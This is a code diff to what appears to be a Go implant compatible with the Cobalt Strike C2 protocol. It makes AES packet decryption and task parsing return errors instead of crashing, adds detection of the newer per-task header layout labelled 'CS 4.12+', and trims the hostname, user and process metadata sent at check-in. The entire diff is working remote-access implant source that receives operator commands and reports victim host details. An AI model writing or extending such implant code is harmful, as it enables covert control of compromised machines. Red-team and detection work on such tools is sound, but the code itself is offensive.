@@ -37,39 +37,88 @@ func ReadInt(b []byte) uint32 {
 	return binary.BigEndian.Uint32(b)
 }
 
-func DecryptPacket(b []byte) []byte {
+func DecryptPacket(b []byte) ([]byte, error) {
 	decrypted, err := cryptography.AesCBCDecrypt(b, constants.AesKey)
 	if err != nil {
-		panic(err)
+		return nil, err
 	}
-	return decrypted
+	return decrypted, nil
 }
 
-func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
+// Parse the task buffer with a given headerLen
+func validateTaskLayout(taskData []byte, totalLen uint32, headerLen int) (int, bool) {
+	offset := 0
+	taskCount := 0
+	dataLen := int(totalLen)
+
+	for offset+8 <= dataLen {
+		cmdID := binary.BigEndian.Uint32(taskData[offset : offset+4])
+		cmdDataLen := int(binary.BigEndian.Uint32(taskData[offset+4 : offset+8]))
+		offset += 8
+
+		if cmdID == 0 || cmdID > 0xFFFF {
+			return 0, false
+		}
+
+		if headerLen+cmdDataLen > dataLen-offset {
+			return 0, false
+		}
+
+		offset += headerLen + cmdDataLen
+		taskCount++
+	}
+
+	return taskCount, taskCount > 0 && offset == dataLen
+}
+
+//Try new and older task formats and pray one works
+func DetectTaskHeaderLen(taskData []byte, totalLen uint32) int {
+	_, v2Valid := validateTaskLayout(taskData, totalLen, 8)
+	_, v1Valid := validateTaskLayout(taskData, totalLen, 0)
+
+	if v2Valid && !v1Valid {
+		return 8
+	} else if v1Valid && !v2Valid {
+		return 0
+	} else if v2Valid && v1Valid {
+		// Ambiguous: prefer newer layout
+		return 8
+	}
+	// Neither layout valid — default to 0 and let parsing try its best
+	return 0
+}
+
+func ParsePacket(buf *bytes.Buffer, totalLen *uint32, taskHeaderLen int) (uint32, []byte, error) {
 	commandTypeBytes := make([]byte, 4)
 	_, err := buf.Read(commandTypeBytes)
 	if err != nil {
-		panic(err)
+		return 0, nil, fmt.Errorf("reading command type: %w", err)
 	}
 	commandType := binary.BigEndian.Uint32(commandTypeBytes)
 	commandLenBytes := make([]byte, 4)
 	_, err = buf.Read(commandLenBytes)
 	if err != nil {
-		panic(err)
+		return 0, nil, fmt.Errorf("reading command length: %w", err)
 	}
 	commandLen := ReadInt(commandLenBytes)
+
+	// Skip the per-task header if present (CS 4.12+)
+	if taskHeaderLen > 0 {
+		headerBytes := make([]byte, taskHeaderLen)
+		_, err = buf.Read(headerBytes)
+		if err != nil {
+			return 0, nil, fmt.Errorf("reading task header: %w", err)
+		}
+	}
+
 	commandBuf := make([]byte, commandLen)
 	_, err = buf.Read(commandBuf)
 	if err != nil {
-		panic(err)
+		return 0, nil, fmt.Errorf("reading command data: %w", err)
 	}
-	*totalLen = *totalLen - (4 + 4 + commandLen)
+	*totalLen -= (4 + 4 + uint32(taskHeaderLen) + commandLen)
 
-	//For printing out command type from CS
-	//fmt.Printf("Command type: %d", commandType)
-
-	return commandType, commandBuf
-
+	return commandType, commandBuf, nil
 }
 
 func MakePacket(replyType int, b []byte) []byte {
@@ -150,6 +199,11 @@ func MakeMetaInfo() []byte {
 	metadataFlag := os.GetMetaDataFlag()
 	//for OS Version
 	osVersion := os.GetOSVersion()
+	osVersion = strings.TrimSpace(osVersion)
+	// Strip kernel suffix like "-91-generic" from "5.15.0-91-generic"
+	if dashIdx := strings.Index(osVersion, "-"); dashIdx > 0 {
+		osVersion = osVersion[:dashIdx]
+	}
 	osVerSlice := strings.Split(osVersion, ".")
 	osMajorVerison := 0
 	osMinorVersion := 0
@@ -199,6 +253,11 @@ func MakeMetaInfo() []byte {
 	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))
 
 	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
+	// Cap info string to 58 bytes — max for 1024-bit RSA key (117 - 59 fixed fields)
+	// Truncate process name instead of previous hostname - less important
+	if len(osInfo) > 58 {
+		osInfo = osInfo[:58]
+	}
 	osInfoBytes := []byte(osInfo)
 
 	onlineInfoBytes := utilities.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
